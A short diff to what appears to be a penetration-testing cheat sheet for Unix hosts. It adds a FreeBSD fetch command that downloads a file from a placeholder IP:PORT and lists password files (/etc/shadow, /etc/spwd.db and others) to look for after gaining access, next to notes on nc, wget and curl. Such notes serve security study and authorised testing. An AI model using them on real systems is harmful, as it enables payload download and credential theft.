@@ -89,6 +89,12 @@
   - Available programs/languages on host:
     - Perl,python etc
     - Nc,ncat,wget,curl
+    - ```$fetch -o theFile http://IP:PORT/theFile``` (FreeBSD)
+  - Password Files
+    - /etc/pwd.db 
+    - /etc/spwd.db
+    - /etc/shadow
+    - /etc/passwd
 
 <H2>Windows</H2>
 
